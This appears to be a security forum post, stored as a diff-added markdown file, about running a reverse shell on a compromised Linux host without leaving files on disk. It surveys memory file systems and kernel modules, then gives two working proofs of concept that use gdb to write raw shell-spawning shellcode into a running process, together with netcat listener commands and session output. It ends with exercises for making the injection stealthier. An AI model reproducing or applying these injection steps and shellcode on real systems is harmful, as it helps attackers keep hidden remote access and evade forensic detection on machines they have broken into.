@@ -1,0 +1,113 @@
+# Running binaries without leaving tracks
+
+Continuing the discussion from Spawning reverse shells (https://0x00sec.org/t/spawning-reverse-shells/2133/8):
+
+I was about to reply on (Spawning reverse shells - #8 by pry0cc 53), but my reply has got so long that I decided to made it into a post. Please first read the original thread from @RickSanchez and the comments there, before you continue.
+
+The discussion here, is about how to run a reverse shell in a compromised machine without dropping anything on the local storage (whatever it is).
+
+The original article describes how to solve the problem using existing tools in the machine. Then, in the comments I propose to drop a remote shell using the echo technique (or the Chuck Norris way if you prefer:). This technique requires to drop a binary somewhere in the disk before running it. So the following question arose:
+
+Can we run a binary without first dropping it into the local storage?
+
+There are a few posibilities but, they will only work under certain specific circunstances. What is described below is not an universal solution but just more alternatives for different situations.
+
+Option 1. Memory File Systems
+This is the simplest option. You can drop your program in /run/shm or /dev/shm. This is actually memory what means that the binary is not begin actually saved in any storage device. However, this has some limitations.
+
+First, those mount points are usually configured with the noexec flag. This means that you cannot execute programs stored in those folders :frowning: . If you have root access, then you can remount them without that flag.
+
+Second, the binary will be in memory. This means that, a reboot should clean everything up without leaving any track of what happened. However, while the machine is up, the file will be there. Even if we delete it after execution, the binary can still be recovered just dumping the exe folder from its associated /proc entry:
+
+cat /proc/PID/exe > orignal_binary
+
+Option 2. Evil Kernel Module
+This actually implies that the machine have been severely compromised and you have dropped a file (the kernel module) in advance. From kernel space you should have full control of the machine and be able to get code from anywhere, put it in memory at any location you want and run it.
+
+Haven’t tried this so I do not know how difficult it is.
+
+I do not know either whether you will ever see this option in the real world. If somebody has compromised a machine to be able to drop a kernel module, then… you just drop a rootkit and hide whatever you want.
+
+However, note that if the malware is hidden with a rootkit, it is trivial to recover the binary for analysis (just connect the HD to a different machine and mounted the disk from a clean system).
+
+Option 3. Abusing gdb
+Without diving into the kernel, the only way (to my knowledge) to get code executed without using a binary on the disk (under GNU/Linux) is to use the ptrace system call. This way you can attach to any process (as far as it does not have anti-debug code), modify its text segment with your code and restart execution at a convenient place.
+
+This is roughly what is described in this paper:
+
+We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processes in memory… In other words, it will introduce you to the basics of how to write your own debugger. Use Cases Before going into the gory details, let’s introduce a couple of situations that may benef…
+So, if gdb is available in the target machine, you can do all this from gdb just typing the proper sequence of commands. Note that this will imply to type the machine code :).
+
+Of course, you will not type this, you’d either copy&paste or feed it through whatever interface you are using the get shell access to the machine…
+
+So, for educational purposes here is a PoC. The Shellcode comes from (Shellcode: Linux amd64 | modexp 34):
+
+nc -v -l 1234 # Attacker
+# Victim
+$ gdb /bin/cat
+(gdb) set follow-exec-mode new
+(gdb) r
+Starting program: /bin/cat
+^C
+Program received signal SIGINT, Interrupt.
+0x00007ffff7b01eb0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:82
+82	../sysdeps/unix/syscall-template.S: No such file or directory.
+(gdb) set (char[66]) *0x7ffff7b01eb0  = {0x48,0xb8,0xfd,0xff,0xfb,0x2d,0x80,0xff,0xff,0xfe,0x48,0xf7,0xd0,0x50,0x54,0x6a,0x29,0x58,0x6a,0x01,0x5e,0x6a,0x02,0x5f,0x99,0x0f,0x05,0x97,0x96,0xb0,0x21,0x0f,0x05,0x83,0xee,0x01,0x79,0xf7,0x5e,0xb2,0x10,0xb0,0x2a,0x0f,0x05,0x99,0x52,0x5e,0x52,0x48,0xb9,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x51,0x54,0x5f,0xb0,0x3b,0x0f,0x05}
+(gdb) c
+Continuing.
+<PRESS ENTER HERE>
+process 4142 is executing new program: /bin/dash
+A couple of comments:
+
+The set follow-exec-mode new command at the beginning is just to avoid gdb to get control back after execing the shell. If not used you just need to issue the command c (continue) again.
+gdb will be visible in the list of active processes which is suspicious.
+This technique could be applied to a running process, but in that case you need root access in order to attach to a process that is not your child
+Option 4. More gdb abusing
+For this last scenario, when you have root access, you can just attach to a running process, modify it and leave it running. This is how it would look like:
+
+nc -v -l 1234 # Attacker
+# Victim1
+$ cat   # Target process, can be something already running
+
+# Victim2
+$ pidof cat
+4637
+$ sudo gdb -p 4637
+Attaching to process 4637
+Reading symbols from /bin/cat...(no debugging symbols found)...done.
+Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug/lib/x86_64-linux-gnu/libc-2.15.so...done.
+done.
+Loaded symbols for /lib/x86_64-linux-gnu/libc.so.6
+Reading symbols from /lib64/ld-linux-x86-64.so.2...Reading symbols from /usr/lib/debug/lib/x86_64-linux-gnu/ld-2.15.so...done.
+done.
+Loaded symbols for /lib64/ld-linux-x86-64.so.2
+0x00007f4360138eb0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:82
+82	../sysdeps/unix/syscall-template.S: No such file or directory.
+
+(gdb)  set (int[17])*(int*)$rip = { 0xfffdb848, 0xff802dfb, 0xf748feff, 0x6a5450d0, 0x16a5829, 0x5f026a5e, 0x97050f99, 0xf21b096, 0x1ee8305, 0xb25ef779, 0xf2ab010, 0x5e529905, 0x2fb94852, 0x2f6e6962, 0x5168732f, 0x3bb05f54, 0x0000050f}
+(gdb) detach
+Detaching from program: /bin/cat, process 4637
+(gdb) q
+This time, I’m poking the data with a different command. It is a bit more convenient as I uses the rip register value (that already holds an address suitable for our purposes) and dumps double words instead of bytes… Just another way of doing it.
+
+Now, you can press enter in the session where you run cat and get your reverse shell on the netcat server.
+
+We have to press ENTER in both cases, because cat is blocked in a read to get data from stdin. Pressing ENTER will finish the system call and actually run the code we have injected… Well, at least, this is what I think is happening (see the __read_nocancel reference above). If I’m wrong, please do not hesitate to correct me.
+
+The process list will just show the already existing cat process. However it is no longer a cat it is now our doggy reverse shell. However, the connection will be visible through netstat or lsof.
+
+What we have just done is similar to the meterpreter process migration capabilities. It works a bit different in Windows, but, as far as I know, the concept is the same…
+
+As a final comment, it may be possible to do all this if there is an exploit that can be used against the target machine. In that case, the exploit payload can already be the remote shell or a loader (the meterpreter way) that can allocate memory and load code transferred through the active connection.
+
+Are you Bored?
+So you are bored to dead and desperately looking for projects to do and sharp your skills. Goodl!. These are some things you can try:
+
+Try to reproduce this using a remote exploit. You can take the vulnerable server from Remote Exploit. Shellcode without Sockets 50 to get started
+Try not to destroy the binary. This requires:
+to get a copy of the victim process state and of the original code we overwrite during the injection process
+to modify the payload to start a thread (or a process) to run our code
+to restore the original code as well as its state and restore the original execution
+Hack fun!
+
+
